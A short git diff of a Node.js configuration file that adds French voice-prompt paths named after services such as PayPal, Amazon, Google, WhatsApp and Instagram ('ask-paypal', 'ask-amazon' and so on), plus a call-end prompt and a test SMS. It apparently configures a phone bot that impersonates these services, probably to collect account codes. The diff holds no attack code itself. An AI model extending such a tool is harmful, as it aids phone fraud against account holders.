@@ -9,12 +9,17 @@ module.exports = {
 
     port: process.env.PORT || 1337, 
 
-    paypalfilepath: './voice/fr/pp/ask-pp.mp3',
-    snapchatfilepath: '',
-    instagramfilepath: '',
-    facebookfilepath: '',
+    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
+    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
+    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
+    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
+    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
+    googlefilepath: './voice/fr/google/ask-google.mp3',
+    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
+    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
+    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
     endfilepath: './voice/fr/done/call-done.mp3',
-    default :'',
+    defaultfilepath:'./voice/fr/default/ask-default.mp3',
 
     // Services : sms
     paypalsms: 'pp test 123'
